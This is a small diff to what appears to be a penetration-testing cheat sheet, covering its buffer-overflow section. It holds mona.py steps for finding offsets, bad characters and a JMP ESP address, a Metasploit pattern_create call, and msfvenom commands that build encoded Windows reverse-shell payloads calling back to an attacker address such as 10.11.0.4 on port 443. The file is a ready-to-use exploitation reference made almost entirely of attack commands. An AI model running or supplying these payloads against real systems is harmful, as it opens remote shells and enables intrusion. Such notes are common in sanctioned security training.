@@ -361,12 +361,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
 
 # BUFFER OVERFLOW 
 ```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
 !mona config -set workingfolder c:\mona\bruiser
 !mona findmsp -distance 600
 !mona bytearray -b "\x00"
 !mona compare -f C:\mona\bruiser\bytearray.bin -a esp
 !mona jmp -r esp -cpb "\x00"
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+
 
 MATCH YOUR PAYLOAD LANGUAGE WITH THE LANGUAGE OF THE PROGRAM RUNNING (WINDOWS IS PROBABLY RUNNING C)
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\
